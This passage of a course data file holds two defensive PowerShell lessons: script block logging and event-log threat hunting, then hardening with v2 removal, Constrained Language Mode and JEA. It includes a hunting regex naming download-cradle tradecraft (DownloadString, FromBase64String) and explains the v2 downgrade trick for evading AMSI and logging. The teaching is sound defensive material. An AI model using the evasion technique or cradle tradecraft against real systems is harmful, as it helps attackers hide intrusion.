  // CHAPTER 16: BLUE TEAM FORENSICS, THREAT HUNTING & ENTERPRISE HARDENING
  // ==========================================================================
  {
    id: '16-1',
    chapterId: 'chapter-16',
    slug: 'powershell-auditing-and-logging',
    title: 'The Blue Team Superpower: Script Block Logging (4104), Transcription & Get-WinEvent',
    subtitle: 'Why obfuscation fails against Event ID 4104 and how to query forensic event logs with surgical speed',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'Enabling the Holy Trinity of PowerShell telemetry - **Script Block Logging (Event ID 4104)**, **Module Logging (Event ID 4103)**, and **System-Wide Transcription** - records every decoded command an attacker runs, ready to hunt with `Get-WinEvent -FilterHashtable`.',
    summary:
      'Years ago, attackers loved PowerShell because they thought running commands in memory left zero forensic trace on disk. Then PowerShell 5.1 and 7 introduced the most comprehensive auditing engine of any command shell in history! In this lesson, we configure the **Holy Trinity of PowerShell Logging** (`Event ID 4104`, `Event ID 4103`, and `Start-Transcript`), learn why `Get-WinEvent -FilterHashtable` is 50x faster than legacy `Get-EventLog`, and hunt for malicious payloads and failed logons (`Event ID 4625`).',
    whyItMatters:
      'When an incident happens, **Event ID 4104 (`Microsoft-Windows-PowerShell/Operational`)** is the single most valuable log on the machine: it records the **full, de-obfuscated source code** of every scriptblock that executed in memory, even if the attacker deleted the script or used `IEX`!',
    learningObjectives: [
      'Configure the 3 pillars of PowerShell telemetry: **Script Block Logging (Event ID 4104)**, **Module/Pipeline Logging (Event ID 4103)**, and **Transcription (`Start-Transcript`)**',
      'Explain why Event ID `4104` automatically logs suspicious commands (like `Invoke-Expression`, `Get-Credential`, or `DownloadString`) at `Warning` level even before full logging is turned on',
      'Memorize the key Windows forensic Event IDs: **`4104`** (Script Block), **`4103`** (Module Pipeline), **`4688`** (Process Creation), **`4624`** (Successful Logon), and **`4625`** (Failed Logon)',
      'Query event logs at native speed using `Get-WinEvent -FilterHashtable @{ LogName = ...; Id = ... }`',
    ],
    keyTerms: [
      'Event ID 4104 (Script Block Logging)',
      'Event ID 4103 (Module / Pipeline Logging)',
      'System-Wide Transcription (Start-Transcript)',
      'Get-WinEvent -FilterHashtable',
      'Microsoft-Windows-PowerShell/Operational',
      'Event ID 4624 / 4625 / 4688 (Security Log)',
    ],
    conceptSections: [
      {
        heading: 'The Holy Trinity of PowerShell Telemetry: 4104, 4103 & Transcription',
        body: [
          'Every Blue Team engineer and SOC analyst configures three complementary layers of PowerShell visibility via Group Policy (`Administrative Templates → Windows Components → Windows PowerShell`):\n1. **Script Block Logging (`Event ID 4104` in `Microsoft-Windows-PowerShell/Operational`):**\n   Records the **complete, de-obfuscated code block** as the PowerShell engine compiles it in memory! Even if an attacker runs a 3-layer Base64 `IEX` cradle from memory, Event ID `4104` captures the final plain-text script that actually executed!\n2. **Module / Pipeline Logging (`Event ID 4103`):**\n   Records every pipeline execution, including parameter bindings and the output objects produced by specified modules (`*`).\n3. **System-Wide Transcription (or `Start-Transcript` / `Stop-Transcript`):**\n   Records an exact, "over-the-shoulder" text log of everything typed into the console AND everything printed back to the screen into a timestamped `.txt` file on a write-only network share!',
        ],
      },
      {
        heading: 'Surgical Threat Hunting with Get-WinEvent -FilterHashtable',
        body: [
          'Never use `Get-EventLog` (it is deprecated, doesn’t exist in PowerShell 7, and cannot read modern `Applications and Services Logs` like `Microsoft-Windows-PowerShell/Operational`). Always use **`Get-WinEvent`**!',
          'And remember our **Filter Left** law from Chapter 7? Never run `Get-WinEvent -LogName Security | Where-Object Id -eq 4625` on a 2 GB Security log! Instead, pass a hashtable to **`-FilterHashtable`**:\n```powershell\nGet-WinEvent -FilterHashtable @{\n    LogName   = "Microsoft-Windows-PowerShell/Operational"\n    Id        = 4104\n    StartTime = (Get-Date).AddHours(-24)\n}\n```\nThe Windows Event Log engine filters at the source in milliseconds!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Event ID `4104` (`Microsoft-Windows-PowerShell/Operational`) captures the fully decoded source code of in-memory scripts, and `Get-WinEvent -FilterHashtable` queries it at native speed.',
      },
      {
        type: 'pro',
        title: 'The 5 Event IDs Every Security Engineer Knows by Heart',
        body: '• **`4104`** (`PowerShell/Operational`): Executed PowerShell Script Block (decoded code)\n• **`4103`** (`PowerShell/Operational`): Module Pipeline Execution & Parameter Binding\n• **`4688`** (`Security`): New Process Created (with full command line & parent process)\n• **`4624`** (`Security`): Successful Account Logon (`LogonType 3` = Network, `10` = RDP)\n• **`4625`** (`Security`): Failed Account Logon (Brute-Force / Password Spraying)',
      },
      {
        type: 'try',
        title: 'Record Your Own Session with Start-Transcript',
        body: 'Run `Start-Transcript -Path "$env:TEMP\\my-session.txt"`, run two or three commands, and then run `Stop-Transcript`. Open `$env:TEMP\\my-session.txt` to see the complete forensic header and command transcript!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-WinEvent',
        aliases: [],
        syntax: 'Get-WinEvent -FilterHashtable <Hashtable> [-MaxEvents <Int64>] [-ComputerName <String>]',
        parameters: [
          {
            name: '-FilterHashtable',
            type: 'Hashtable',
            description: 'High-speed source filter accepting keys: LogName, Id, Level, StartTime, EndTime, ProviderName.',
          },
          {
            name: '-MaxEvents',
            type: 'Int64',
            description: 'Limits the maximum number of matching events returned (much faster than piping to Select-Object -First!).',
          },
        ],
        examples: [
          'Get-WinEvent -FilterHashtable @{ LogName = "Microsoft-Windows-PowerShell/Operational"; Id = 4104 } -MaxEvents 10',
        ],
      },
      {
        cmdlet: 'Start-Transcript',
        aliases: [],
        syntax: 'Start-Transcript [[-Path] <String>] [-Append]',
        parameters: [
          {
            name: '-Path',
            type: 'String',
            description: 'Specifies the file path where the session transcript will be recorded.',
          },
        ],
        examples: ['Start-Transcript -Path C:\\Logs\\SessionAudit.txt'],
      },
    ],
    codeExamples: [
      {
        title: 'Enabling Script Block Logging (4104) via Registry and Hunting Malicious ScriptBlocks',
        description: 'Enable PowerShell Script Block Logging (4104) and hunt for suspicious keywords inside Event ID 4104 logs.',
        code: `# 1. Enable PowerShell Script Block Logging (Event ID 4104) via Registry Policy
$sbPath = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'
New-Item -Path $sbPath -Force | Out-Null
Set-ItemProperty -Path $sbPath -Name 'EnableScriptBlockLogging' -Value 1

# 2. Hunt Event ID 4104 for suspicious tradecraft keywords (IEX, DownloadString, FromBase64String, amsi)
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-PowerShell/Operational'
  Id      = 4104
} -MaxEvents 50 |
  Where-Object { $_.Message -match 'Invoke-Expression|DownloadString|FromBase64String|adsisearcher' } |
  Select-Object TimeCreated, Id, LevelDisplayName, @{
    Name       = 'Snippet'
    Expression = { $_.Message.Substring(0, [math]::Min(90, $_.Message.Length)) }
  }

# 3. Hunt Failed Logon Attempts (Event ID 4625) in the last 24 hours
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4625
  StartTime = (Get-Date).AddHours(-24)
} -MaxEvents 5 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated, Id, MachineName`,
        output: `TimeCreated            Id LevelDisplayName Snippet
-----------            -- ---------------- -------
11/3/2026 11:58:12 PM 4104 Warning          Creating Scriptblock text (1 of 1): [System.Text.Encoding]::Unicode.GetString([System...`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-WinEvent -LogName Security | Where-Object Id -eq 4625` on a production Domain Controller.',
        cause: 'Pulling millions of Security events across the pipeline before checking the Event ID takes minutes and spikes CPU.',
        fix: 'Always filter at the source with `Get-WinEvent -FilterHashtable @{ LogName = "Security"; Id = 4625 } -MaxEvents 20`.',
      },
    ],
    tryItYourself: [
      'Run `Get-WinEvent -FilterHashtable @{ LogName = "Microsoft-Windows-PowerShell/Operational"; Id = 4104 } -MaxEvents 5 | Select-Object TimeCreated, Id, Message` on your Windows machine to see real Script Block logs.',
      'Run `Start-Transcript`, execute `Get-Date`, and run `Stop-Transcript` to inspect the generated transcript file.',
    ],
    knowledgeCheck: [
      {
        question: 'Which Windows Event ID inside `Microsoft-Windows-PowerShell/Operational` records the full, de-obfuscated source code of executed PowerShell scriptblocks?',
        options: ['Event ID 1000', 'Event ID 4104', 'Event ID 4624', 'Event ID 7045'],
        correctIndex: 1,
        explanation: 'Event ID 4104 (Script Block Logging) captures the compiled, decoded text of PowerShell scriptblocks executed in memory.',
      },
      {
        question: 'Why should you use `Get-WinEvent -FilterHashtable @{ LogName="Security"; Id=4625 }` instead of `Get-WinEvent -LogName Security | Where-Object Id -eq 4625`?',
        options: [
          'Where-Object cannot compare numbers',
          '-FilterHashtable filters at the Windows Event Log engine level before constructing .NET objects, making it orders of magnitude faster',
          'Get-WinEvent does not support pipes',
          'Event ID 4625 only exists in hashtable format',
        ],
        correctIndex: 1,
        explanation: 'Passing -FilterHashtable applies the Filter Left principle so the OS Event Log service returns only matching Event IDs.',
      },
    ],
  },

  {
    id: '16-2',
    chapterId: 'chapter-16',
    slug: 'hardening-jea-and-threat-hunting',
    title: 'Enterprise Hardening: Constrained Language Mode, JEA & Stopping v2 Downgrades',
    subtitle: 'Eliminate PowerShell 2.0, restrict .NET access with CLM, and build least-privilege JEA endpoints',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Lock down enterprise PowerShell by removing the legacy `MicrosoftWindowsPowerShellV2` engine (stopping downgrade attacks), enforcing **Constrained Language Mode (CLM)** on standard endpoints, and using **Just Enough Administration (JEA)** so operators only get the exact cmdlets they need, and nothing more.',
    summary:
      'In our final lesson, we bring every track of this academy, Windows Internals, PowerShell Core, Enterprise Infrastructure, and Red/Blue Team Security, together into a complete **Enterprise Hardening Blueprint**. You will learn how attackers try to bypass AMSI and Event ID 4104 using a **PowerShell v2.0 Downgrade Attack** (and how to close that hole forever), how **Constrained Language Mode (CLM)** blocks arbitrary `.NET` and Win32 API abuse while keeping core cmdlets working, and how **Just Enough Administration (JEA)** lets a DNS or Helpdesk admin manage a server via WinRM without ever making them a full Local Administrator!',
    whyItMatters:
      'Implementing these three controls (Disabling PowerShell v2, Enforcing CLM via AppLocker/WDAC, and deploying JEA endpoints) transforms your Windows environment from a soft target into a hardened fortress.',
    learningObjectives: [
      'Explain why attackers run `powershell.exe -Version 2` (PowerShell Downgrade Attack) to evade AMSI and Event ID 4104, and remove the v2 feature permanently',
      'Compare **`FullLanguage`** mode with **`ConstrainedLanguage` (CLM)** (`$ExecutionContext.SessionState.LanguageMode`) and explain what CLM blocks',
      'Architect **Just Enough Administration (JEA)** using Role Capability files (`.psrc`) and Session Configuration files (`.pssc`)',
      'Explain how JEA’s **Virtual Account (`RunAsVirtualAccount = $true`)** lets a non-admin run specific elevated tasks via WinRM without ever receiving local admin credentials',
    ],
    keyTerms: [
      'PowerShell v2.0 Downgrade Attack',
      'Constrained Language Mode (CLM)',
      '$ExecutionContext.SessionState.LanguageMode',
      'Just Enough Administration (JEA)',
      'Role Capability File (.psrc) & Session Config (.pssc)',
      'RunAsVirtualAccount (Least-Privilege WinRM)',
    ],
    conceptSections: [
      {
        heading: 'Closing the #1 Bypass Hole: Stopping PowerShell v2.0 Downgrade Attacks',
        body: [
          'In Lesson 15-2 and 16-1, we saw that **AMSI** and **Script Block Logging (Event ID 4104)** were introduced in **PowerShell 5.0/5.1**. What if an older Windows installation still has the legacy **Windows PowerShell 2.0 Engine** optional feature installed, and an attacker types:\n`powershell.exe -Version 2 -Command "..."`?',
          'If PowerShell 2.0 is still installed, PowerShell boots up the ancient 2009 v2.0 engine, which has **zero AMSI integration and zero Script Block Logging (4104)!** That is called a **PowerShell Downgrade Attack**.\n• **How to audit and kill it forever:**\n  `Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`\n  `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart`',
        ],
      },
      {
        heading: 'Constrained Language Mode (CLM): Pulling the Plug on Arbitrary .NET Abuse',
        body: [
          'Remember how offensive scripts in Chapter 15 used raw `.NET` classes like `New-Object System.Net.WebClient`, `[adsisearcher]`, or inline C# (`Add-Type`)? Normal PowerShell runs in **`FullLanguage`** mode, which allows full access to the entire `.NET` framework.',
          'When you enforce **AppLocker** or **Windows Defender Application Control (WDAC)** on an endpoint, untrusted scripts are automatically dropped into **`ConstrainedLanguage` (CLM)** mode!\n• **What still works in CLM?** All native signed cmdlets (`Get-Process`, `Get-Service`, `Stop-Process`, pipelines, loops, variables).\n• **What is BLOCKED in CLM?** Arbitrary `.NET` type creation (`New-Object Net.WebClient`), `[adsisearcher]`, COM objects, and `Add-Type` C# compilation! Offensive toolkits collapse immediately.\n• Check your current language mode right now: **`$ExecutionContext.SessionState.LanguageMode`**.',
        ],
      },
      {
        heading: 'Just Enough Administration (JEA): Zero-Standing-Privilege Remoting',
        body: [
          'Remember my #1 rule from Lesson 1-1: **The Principle of Least Privilege**? Suppose a junior Helpdesk engineer needs to restart the `Spooler` and `Dns` services and flush the DNS cache on a Domain Controller via WinRM. In the old days, you had to put them in the **`Domain Admins`** or **`Administrators`** group, giving them total power to dump `lsass.exe` or delete the domain!',
          '**Just Enough Administration (JEA)** solves this inside WinRM:\n1. **Role Capability File (`.psrc` - `New-PSRoleCapabilityFile`):** Lists the **exact cmdlets and parameters** that role is allowed to run (e.g., `VisibleCmdlets = "Restart-Service", "Clear-DnsServerCache"`). Every other cmdlet (`Get-ADUser`, `Stop-Computer`, `Invoke-Expression`) simply does not exist in their session!\n2. **Session Configuration File (`.pssc` - `New-PSSessionConfigurationFile`):** Configures `SessionType = "RestrictedRemoteServer"` and **`RunAsVirtualAccount = $true`**.\nWhen the Helpdesk user connects (`Enter-PSSession -ComputerName SRV-DC01 -ConfigurationName HelpdeskJEA`), WinRM generates a temporary, one-time **Virtual Admin Account** behind the scenes that can *only* run those two allowed cmdlets, logs every keystroke to a transcript folder, and vanishes when they disconnect!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Remove PowerShell v2.0 to prevent logging bypasses, enforce `ConstrainedLanguage` mode via WDAC/AppLocker to block raw `.NET` tradecraft, and use **JEA** (`.psrc` + `.pssc`) to grant surgical, cmdlet-level WinRM privileges without handing out Admin rights.',
      },
      {
        type: 'try',
        title: 'Check Your Current PowerShell Language Mode',
        body: 'Run `$ExecutionContext.SessionState.LanguageMode` right now. On a standard admin machine it returns `FullLanguage`; on a WDAC/AppLocker-locked endpoint it returns `ConstrainedLanguage`!',
      },
      {
        type: 'pro',
        title: 'Full-Circle Mastery',
        body: 'Notice how JEA brings us full circle back to Chapter 1’s **Principle of Least Privilege**: instead of securing *machines* by hiding the command line, we use PowerShell itself to enforce least-privilege access at the individual cmdlet and parameter level!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-PSRoleCapabilityFile',
        aliases: [],
        syntax: 'New-PSRoleCapabilityFile -Path <String> [-VisibleCmdlets <Object[]>] [-VisibleFunctions <String[]>]',
        parameters: [
          {
            name: '-Path',
            type: 'String',
            description: 'Path to the .psrc Role Capability file defining which cmdlets and parameters a JEA role can execute.',
          },
          {
            name: '-VisibleCmdlets',
            type: 'Object[]',
            description: 'Whitelist of cmdlets (and allowed parameter values) exposed to the JEA user.',
          },
        ],
        examples: [
          'New-PSRoleCapabilityFile -Path .\\DnsOps.psrc -VisibleCmdlets "Restart-Service", "Clear-DnsServerCache"',
        ],
      },
      {
        cmdlet: 'New-PSSessionConfigurationFile',
        aliases: [],
        syntax: 'New-PSSessionConfigurationFile -Path <String> [-SessionType <SessionType>] [-RunAsVirtualAccount] [-TranscriptDirectory <String>]',
        parameters: [
          {
            name: '-SessionType',
            type: 'SessionType',
            description: 'Set to RestrictedRemoteServer for JEA endpoints so only whitelisted cmdlets exist.',
          },
          {
            name: '-RunAsVirtualAccount',
            type: 'SwitchParameter',
            description: 'Executes whitelisted cmdlets under a temporary, isolated virtual admin token without granting the user standing admin rights.',
          },
        ],
        examples: [
          'New-PSSessionConfigurationFile -Path .\\DnsOps.pssc -SessionType RestrictedRemoteServer -RunAsVirtualAccount -TranscriptDirectory C:\\JEALogs',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Enterprise Hardening Audit: Disabling PowerShell v2, Checking Language Mode & Creating JEA Files',
        description: 'Verify that PowerShell 2.0 is disabled, inspect the current LanguageMode, and scaffold a least-privilege JEA endpoint.',
        code: `# 1. Audit whether legacy PowerShell v2.0 is still enabled (Downgrade Attack Risk!)
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root |
  Select-Object FeatureName, State

# Disable PowerShell v2.0 permanently if enabled:
# Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart

# 2. Check active PowerShell Language Mode (FullLanguage vs ConstrainedLanguage)
Write-Output "Active Language Mode: $($ExecutionContext.SessionState.LanguageMode)"

# 3. Create a JEA Role Capability (.psrc) allowing ONLY Spooler/DNS service restarts
$psrcPath = Join-Path $env:TEMP 'DnsHelpdesk.psrc'
New-PSRoleCapabilityFile -Path $psrcPath -VisibleCmdlets @(
  'Get-Service',
  @{ Name = 'Restart-Service'; Parameters = @{ Name = 'Name'; ValidateSet = 'Spooler', 'DNS' } }
)

# 4. Create a JEA Session Configuration (.pssc) with Virtual Account & Mandatory Transcription
$psscPath = Join-Path $env:TEMP 'DnsHelpdesk.pssc'
New-PSSessionConfigurationFile -Path $psscPath \`
  -SessionType RestrictedRemoteServer \`
  -RunAsVirtualAccount \`
  -TranscriptDirectory 'C:\\ProgramData\\JEAConfiguration\\Transcripts'

Write-Output "Generated JEA Role (.psrc) and Session Config (.pssc) successfully."`,
        output: `FeatureName                      State
-----------                      -----
MicrosoftWindowsPowerShellV2Root Disabled

Active Language Mode: FullLanguage
Generated JEA Role (.psrc) and Session Config (.pssc) successfully.`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Setting `$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"` inside a plain `.ps1` script without AppLocker or WDAC thinking an attacker cannot just open a new `powershell.exe` window.',
        cause: 'Setting the variable manually only affects that single window; system-wide Constrained Language Mode must be enforced by an **AppLocker** or **WDAC** policy so every untrusted process starts in CLM automatically.',
        fix: 'Deploy WDAC or AppLocker script enforcement policies via Group Policy or Intune.',
      },
    ],
    tryItYourself: [
      'Run `$ExecutionContext.SessionState.LanguageMode` in your terminal to inspect your current language mode.',
      'Generate the `DnsHelpdesk.psrc` and `DnsHelpdesk.pssc` files in `$env:TEMP` and open them with `Get-Content` to see how readable JEA configuration files are!',
    ],
    knowledgeCheck: [
      {
        question: 'Why do attackers attempt a "PowerShell v2.0 Downgrade Attack" (`powershell.exe -Version 2`), and how do defenders prevent it?',
        options: [
          'PowerShell 2.0 runs 10x faster; defenders prevent it by unplugging the network cable',
          'PowerShell 2.0 lacks AMSI and Script Block Logging (Event ID 4104); defenders prevent it by removing the MicrosoftWindowsPowerShellV2Root Windows optional feature',
          'PowerShell 2.0 gives free Domain Admin access',
          'PowerShell 2.0 only runs on macOS',
        ],
        correctIndex: 1,
        explanation: 'The legacy PowerShell 2.0 engine predates AMSI and Event ID 4104 telemetry. Disabling the MicrosoftWindowsPowerShellV2Root feature eliminates the downgrade path completely.',
      },
      {
        question: 'What does Just Enough Administration (JEA) with `RunAsVirtualAccount = $true` allow you to accomplish?',
        options: [
          'Give every employee full Domain Admin rights',
          'Allow non-admin operators to connect via WinRM and run only a strictly whitelisted set of cmdlets/parameters using a temporary virtual admin token',
          'Disable WinRM on all servers',
          'Turn off the Windows Firewall',
        ],
        correctIndex: 1,
        explanation: 'JEA restricts a WinRM endpoint to specific whitelisted cmdlets and parameters (.psrc) and executes them under an isolated virtual account (.pssc) with mandatory transcription.',
      },
    ],
  },
];
